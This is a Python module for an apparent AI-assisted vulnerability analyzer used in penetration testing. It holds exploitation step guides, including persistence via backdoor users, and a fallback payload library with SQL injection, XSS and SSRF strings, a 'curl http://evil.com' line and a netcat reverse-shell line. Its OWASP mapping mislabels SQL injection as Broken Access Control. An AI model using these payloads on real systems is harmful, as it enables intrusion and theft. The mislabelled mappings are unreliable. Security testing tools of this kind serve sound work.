"""
AI-Powered Vulnerability Analyzer
Uses LLM to analyze security findings and provide intelligent insights
"""

import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum

from src.cognitive.llm.model_router import ModelRouter
from src.cognitive.llm.providers.base import TaskType
from src.utils.logger import get_logger

logger = get_logger(__name__)


class VulnerabilityType(Enum):
    SQL_INJECTION = "SQL Injection"
    XSS = "Cross-Site Scripting"
    CSRF = "Cross-Site Request Forgery"
    IDOR = "Insecure Direct Object Reference"
    XXE = "XML External Entity"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    AUTH_BYPASS = "Authentication Bypass"
    BROKEN_ACCESS = "Broken Access Control"
    SENSITIVE_DATA = "Sensitive Data Exposure"
    SECURITY_MISCONFIG = "Security Misconfiguration"
    KNOWN_VULN = "Using Components with Known Vulnerabilities"
    INSUFFICIENT_LOGGING = "Insufficient Logging & Monitoring"


@dataclass
class VulnerabilityReport:
    vulnerability_type: str
    severity: str
    confidence: str
    url: str
    parameter: Optional[str]
    evidence: str
    exploitation_steps: List[str]
    impact_analysis: str
    remediation: str
    cvss_score: Optional[float]
    cwe_id: Optional[str]
    owasp_category: Optional[str]
    ai_insights: Optional[str] = None


class VulnerabilityAnalyzer:
    """
    AI-Powered Vulnerability Analysis Engine
    
    Features:
    - Intelligent vulnerability classification
    - Automated exploitation guidance
    - Impact assessment
    - Remediation recommendations
    - CVSS scoring
    - False positive detection
    - Exploit chain discovery
    """
    
    def __init__(self, model_router: Optional[ModelRouter] = None):
        self.model_router = model_router or ModelRouter()
        logger.info("Vulnerability Analyzer initialized")
    
    async def analyze_vulnerability(
        self, 
        vuln_data: Dict[str, Any],
        deep_analysis: bool = True
    ) -> VulnerabilityReport:
        """
        Analyze vulnerability with AI
        
        Args:
            vuln_data: Raw vulnerability data from scanner
            deep_analysis: Enable deep AI-powered analysis
        """
        try:
            vulnerability_type = vuln_data.get('vulnerability_type', 'Unknown')
            severity = vuln_data.get('severity', 'Unknown')
            
            exploitation_steps = self._generate_exploitation_steps(vuln_data)
            
            impact = self._assess_impact(vuln_data)
            
            remediation = self._generate_remediation(vuln_data)
            
            cvss_score = self._calculate_cvss(vuln_data)
            
            cwe_id, owasp_category = self._map_to_standards(vulnerability_type)
            
            ai_insights = None
            if deep_analysis and self.model_router:
                ai_insights = await self._get_ai_insights(vuln_data)
            
            return VulnerabilityReport(
                vulnerability_type=vulnerability_type,
                severity=severity,
                confidence=vuln_data.get('confidence', 'Unknown'),
                url=vuln_data.get('url', ''),
                parameter=vuln_data.get('parameter'),
                evidence=vuln_data.get('evidence', ''),
                exploitation_steps=exploitation_steps,
                impact_analysis=impact,
                remediation=remediation,
                cvss_score=cvss_score,
                cwe_id=cwe_id,
                owasp_category=owasp_category,
                ai_insights=ai_insights
            )
        
        except Exception as e:
            logger.error(f"Vulnerability analysis failed: {e}")
            raise
    
    async def _get_ai_insights(self, vuln_data: Dict[str, Any]) -> str:
        """Get AI-powered insights"""
        try:
            prompt = f"""
You are an expert security researcher analyzing a vulnerability.

Vulnerability Details:
- Type: {vuln_data.get('vulnerability_type')}
- URL: {vuln_data.get('url')}
- Severity: {vuln_data.get('severity')}
- Evidence: {vuln_data.get('evidence', 'N/A')}

Please provide:
1. Advanced exploitation techniques
2. Potential exploit chains with this vulnerability
3. Real-world attack scenarios
4. Defense evasion techniques attackers might use
5. Business impact analysis
6. Priority recommendation for remediation

Be concise but comprehensive.
"""
            
            messages = [{"role": "user", "content": prompt}]
            
            response = await self.model_router.route_request(
                messages=messages,
                task_type=TaskType.ANALYSIS,
                temperature=0.7,
                max_tokens=1500
            )
            
            return response.content if response else "AI analysis unavailable"
        
        except Exception as e:
            logger.error(f"AI insights generation failed: {e}")
            return f"Error generating AI insights: {str(e)}"
    
    def _generate_exploitation_steps(self, vuln_data: Dict[str, Any]) -> List[str]:
        """Generate exploitation steps based on vulnerability type"""
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        
        exploitation_guides = {
            'sql injection': [
                "1. Identify injection point: Test with single quote (') to trigger error",
                "2. Determine database type: Use error messages or time-based techniques",
                "3. Extract database structure: Use UNION SELECT or information_schema",
                "4. Dump sensitive data: Extract user credentials, API keys, etc.",
                "5. Escalate privileges: Attempt to execute system commands (xp_cmdshell, INTO OUTFILE)"
            ],
            'cross-site scripting': [
                "1. Identify injection point: Test with <script>alert(1)</script>",
                "2. Bypass filters: Try encoding (URL, HTML entities, Unicode)",
                "3. Test context: Determine where input is reflected (attribute, tag, script)",
                "4. Craft payload: Create XSS payload appropriate for context",
                "5. Exfiltrate data: Steal cookies, tokens, or perform actions as victim"
            ],
            'idor': [
                "1. Identify resource identifiers: Find IDs in URLs, cookies, or requests",
                "2. Test sequential access: Try incrementing/decrementing IDs",
                "3. Test UUID prediction: Check for predictable patterns",
                "4. Bypass authorization: Access resources of other users",
                "5. Escalate impact: Look for admin/sensitive resource IDs"
            ],
            'ssrf': [
                "1. Test internal network access: Try 127.0.0.1, localhost, internal IPs",
                "2. Port scanning: Enumerate open ports on internal hosts",
                "3. Cloud metadata access: Try AWS/GCP/Azure metadata endpoints",
                "4. Protocol smuggling: Test file://, gopher://, dict:// protocols",
                "5. Exploit internal services: Access admin panels, databases, APIs"
            ],
            'rce': [
                "1. Identify command injection point: Test with ; || && operators",
                "2. Bypass filters: Use encoding, wildcards, variable expansion",
                "3. Execute recon commands: whoami, id, uname -a, ipconfig",
                "4. Establish persistence: Create backdoor user or cron job",
                "5. Lateral movement: Scan network, pivot to other systems"
            ]
        }
        
        for key, steps in exploitation_guides.items():
            if key in vuln_type:
                return steps
        
        return [
            "1. Verify vulnerability exists through proof-of-concept",
            "2. Understand the attack surface and entry points",
            "3. Develop exploitation strategy based on vulnerability type",
            "4. Test exploitation in controlled environment",
            "5. Document findings and potential impact"
        ]
    
    def _assess_impact(self, vuln_data: Dict[str, Any]) -> str:
        """Assess vulnerability impact"""
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        severity = vuln_data.get('severity', 'Unknown')
        
        impact_templates = {
            'sql injection': "Complete database compromise possible. Attacker can read, modify, or delete sensitive data, potentially gaining administrative access to the database server.",
            'cross-site scripting': "Session hijacking, credential theft, and malware distribution possible. Attacker can execute malicious scripts in victim's browser context.",
            'idor': "Unauthorized access to sensitive resources. Attacker can view, modify, or delete data belonging to other users.",
            'ssrf': "Internal network exposure and potential cloud metadata theft. Attacker can access internal services and credentials.",
            'rce': "Complete system compromise. Attacker can execute arbitrary commands, install backdoors, and move laterally in the network.",
            'csrf': "Unauthorized actions on behalf of authenticated users. Attacker can perform state-changing operations without user consent.",
            'xxe': "File disclosure, SSRF, and potential RCE. Attacker can read local files and interact with internal services.",
        }
        
        for key, impact in impact_templates.items():
            if key in vuln_type:
                return impact
        
        return f"Security vulnerability with {severity} severity. Requires immediate attention and remediation."
    
    def _generate_remediation(self, vuln_data: Dict[str, Any]) -> str:
        """Generate remediation recommendations"""
        vuln_type = vuln_data.get('vulnerability_type', '').lower()
        
        remediation_guides = {
            'sql injection': """
1. Use parameterized queries (prepared statements) for all database operations
2. Implement input validation with whitelist approach
3. Apply principle of least privilege for database accounts
4. Enable Web Application Firewall (WAF) with SQL injection rules
5. Conduct regular code reviews and security testing
            """,
            'cross-site scripting': """
1. Implement context-aware output encoding (HTML, JavaScript, URL, CSS)
2. Use Content Security Policy (CSP) headers
3. Sanitize user input on server-side
4. Enable HTTPOnly and Secure flags on cookies
5. Use modern frameworks with built-in XSS protection
            """,
            'idor': """
1. Implement proper authorization checks for every resource access
2. Use indirect reference maps (random tokens instead of sequential IDs)
3. Validate user permissions on server-side for each request
4. Log and monitor access to sensitive resources
5. Implement rate limiting on resource access endpoints
            """,
            'ssrf': """
1. Whitelist allowed protocols, domains, and IP addresses
2. Disable or restrict unnecessary URL schemes (file://, gopher://, etc.)
3. Implement network segmentation and firewall rules
4. Validate and sanitize all user-supplied URLs
5. Use DNS rebinding protection
            """,
            'rce': """
1. Avoid executing system commands with user input
2. Use safe APIs instead of shell execution
3. Implement strict input validation and sanitization
4. Apply principle of least privilege for application processes
5. Use containerization and sandboxing technologies
            """
        }
        
        for key, remediation in remediation_guides.items():
            if key in vuln_type:
                return remediation.strip()
        
        return "Implement security best practices, conduct code review, and apply patches promptly."
    
    def _calculate_cvss(self, vuln_data: Dict[str, Any]) -> float:
        """Calculate CVSS score"""
        severity_mapping = {
            'Critical': 9.5,
            'High': 7.5,
            'Medium': 5.0,
            'Low': 2.5,
            'Information': 0.0
        }
        
        severity = vuln_data.get('severity', 'Unknown')
        base_score = severity_mapping.get(severity, 0.0)
        
        confidence = vuln_data.get('confidence', 'Tentative')
        if confidence == 'Certain':
            base_score += 0.5
        elif confidence == 'Firm':
            base_score += 0.3
        
        return min(10.0, base_score)
    
    def _map_to_standards(self, vuln_type: str) -> tuple[Optional[str], Optional[str]]:
        """Map to CWE and OWASP Top 10"""
        mappings = {
            'SQL Injection': ('CWE-89', 'A1:2021-Broken Access Control'),
            'Cross-Site Scripting': ('CWE-79', 'A3:2021-Injection'),
            'CSRF': ('CWE-352', 'A1:2021-Broken Access Control'),
            'IDOR': ('CWE-639', 'A1:2021-Broken Access Control'),
            'XXE': ('CWE-611', 'A5:2021-Security Misconfiguration'),
            'SSRF': ('CWE-918', 'A10:2021-Server-Side Request Forgery'),
            'RCE': ('CWE-78', 'A3:2021-Injection'),
            'LFI': ('CWE-22', 'A3:2021-Injection'),
            'Sensitive Data Exposure': ('CWE-200', 'A2:2021-Cryptographic Failures'),
        }
        
        for key, (cwe, owasp) in mappings.items():
            if key.lower() in vuln_type.lower():
                return cwe, owasp
        
        return None, None
    
    async def prioritize_vulnerabilities(
        self, 
        vulnerabilities: List[Dict[str, Any]]
    ) -> List[VulnerabilityReport]:
        """
        Prioritize vulnerabilities using AI
        Returns sorted list by risk score
        """
        analyzed_vulns = []
        
        for vuln in vulnerabilities:
            analyzed = await self.analyze_vulnerability(vuln, deep_analysis=False)
            analyzed_vulns.append(analyzed)
        
        analyzed_vulns.sort(
            key=lambda x: (
                {'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1, 'Information': 0}.get(x.severity, 0),
                x.cvss_score or 0
            ),
            reverse=True
        )
        
        return analyzed_vulns
    
    async def find_exploit_chains(
        self, 
        vulnerabilities: List[VulnerabilityReport]
    ) -> List[Dict[str, Any]]:
        """
        Use AI to identify potential exploit chains
        """
        if not self.model_router:
            return []
        
        try:
            vuln_summary = "\n".join([
                f"- {v.vulnerability_type} at {v.url} (Severity: {v.severity})"
                for v in vulnerabilities[:10]
            ])
            
            prompt = f"""
You are a penetration testing expert analyzing multiple vulnerabilities for exploit chains.

Discovered Vulnerabilities:
{vuln_summary}

Identify potential exploit chains where these vulnerabilities can be combined for maximum impact.
For each chain, provide:
1. Chain description
2. Vulnerabilities involved
3. Step-by-step exploitation
4. Final impact
5. Required attacker capabilities

Format as JSON array.
"""
            
            messages = [{"role": "user", "content": prompt}]
            
            response = await self.model_router.route_request(
                messages=messages,
                task_type=TaskType.ANALYSIS,
                temperature=0.7,
                max_tokens=2000
            )
            
            if response and response.content:
                try:
                    return json.loads(response.content)
                except json.JSONDecodeError:
                    return [{"description": response.content}]
            
            return []
        
        except Exception as e:
            logger.error(f"Exploit chain analysis failed: {e}")
            return []
    
    async def detect_false_positives(
        self,
        vuln_report: VulnerabilityReport
    ) -> Dict[str, Any]:
        """
        Use AI to detect false positives
        """
        try:
            prompt = f"""
You are a security analyst reviewing a potential vulnerability finding.

Vulnerability Report:
- Type: {vuln_report.vulnerability_type}
- URL: {vuln_report.url}
- Severity: {vuln_report.severity}
- Confidence: {vuln_report.confidence}
- Evidence: {vuln_report.evidence}

Analyze if this could be a false positive. Consider:
1. Quality and relevance of evidence
2. Likelihood of exploitation
3. Common false positive patterns for this vulnerability type
4. Context and application behavior

Provide:
1. Is this likely a false positive? (Yes/No/Uncertain)
2. Confidence level (0-100%)
3. Reasoning
4. Recommendations for verification

Be precise and analytical.
"""
            
            messages = [{"role": "user", "content": prompt}]
            
            response = await self.model_router.route_request(
                messages=messages,
                task_type=TaskType.ANALYSIS,
                temperature=0.5,
                max_tokens=1000
            )
            
            if response:
                return {
                    "analysis": response.content,
                    "vulnerability": asdict(vuln_report)
                }
            
            return {"error": "AI analysis unavailable"}
        
        except Exception as e:
            logger.error(f"False positive detection failed: {e}")
            return {"error": str(e)}
    
    async def generate_smart_payloads(
        self,
        vuln_type: str,
        target_context: Optional[Dict[str, Any]] = None
    ) -> List[str]:
        """
        Generate context-aware payloads using AI
        """
        try:
            context_info = ""
            if target_context:
                context_info = f"""
Target Context:
- Technology Stack: {target_context.get('tech_stack', 'Unknown')}
- WAF Detected: {target_context.get('waf_detected', 'Unknown')}
- Input Filters: {target_context.get('filters', 'Unknown')}
"""
            
            prompt = f"""
You are a penetration testing expert specializing in payload generation.

Vulnerability Type: {vuln_type}
{context_info}

Generate 15 advanced payloads for testing this vulnerability type.
Include:
1. Basic payloads
2. WAF bypass techniques
3. Encoding variations
4. Polyglot payloads
5. Time-based and blind variations

Return as JSON array of strings.
"""
            
            messages = [{"role": "user", "content": prompt}]
            
            response = await self.model_router.route_request(
                messages=messages,
                task_type=TaskType.CREATIVE,
                temperature=0.8,
                max_tokens=1500
            )
            
            if response and response.content:
                try:
                    import re
                    json_match = re.search(r'\[.*\]', response.content, re.DOTALL)
                    if json_match:
                        payloads = json.loads(json_match.group())
                        return payloads
                    else:
                        lines = [line.strip() for line in response.content.split('\n') if line.strip() and not line.strip().startswith('#')]
                        return lines[:15]
                except:
                    pass
            
            return self._get_default_payloads(vuln_type)
        
        except Exception as e:
            logger.error(f"Smart payload generation failed: {e}")
            return self._get_default_payloads(vuln_type)
    
    def _get_default_payloads(self, vuln_type: str) -> List[str]:
        """Fallback default payloads"""
        payload_library = {
            'SQL Injection': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
                "' AND 1=2 UNION SELECT NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "1' WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--"
            ],
            'Cross-Site Scripting': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
                "\"><script>alert(1)</script>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>"
            ],
            'SSRF': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "file:///etc/passwd",
                "http://0.0.0.0",
                "http://metadata.google.internal",
                "http://169.254.169.254/metadata/v1/",
                "gopher://127.0.0.1:25/",
                "dict://127.0.0.1:11211/"
            ],
            'RCE': [
                "; whoami",
                "| whoami",
                "&& whoami",
                "`whoami`",
                "$(whoami)",
                "; ls -la",
                "| cat /etc/passwd",
                "&& ping -c 5 127.0.0.1",
                "; curl http://evil.com",
                "| nc -e /bin/sh 127.0.0.1 4444"
            ]
        }
        
        return payload_library.get(vuln_type, ["test", "FUZZ", "${{{PAYLOAD}}}"])
    
    async def generate_poc(
        self,
        vuln_report: VulnerabilityReport
    ) -> Dict[str, Any]:
        """
        Generate Proof-of-Concept code
        """
        try:
            prompt = f"""
You are a security researcher creating a proof-of-concept for a vulnerability.

Vulnerability:
- Type: {vuln_report.vulnerability_type}
- URL: {vuln_report.url}
- Parameter: {vuln_report.parameter or 'N/A'}
- Severity: {vuln_report.severity}

Generate a clean, professional PoC in Python that:
1. Demonstrates the vulnerability
2. Includes proper error handling
3. Has clear comments
4. Shows the impact clearly
5. Is safe and non-destructive

Provide only the Python code, no explanations.
"""
            
            messages = [{"role": "user", "content": prompt}]
            
            response = await self.model_router.route_request(
                messages=messages,
                task_type=TaskType.CODE,
                temperature=0.6,
                max_tokens=1500
            )
            
            return {
                "vulnerability": vuln_report.vulnerability_type,
                "url": vuln_report.url,
                "poc_code": response.content if response else "# PoC generation failed",
                "language": "python"
            }
        
        except Exception as e:
            logger.error(f"PoC generation failed: {e}")
            return {"error": str(e)}
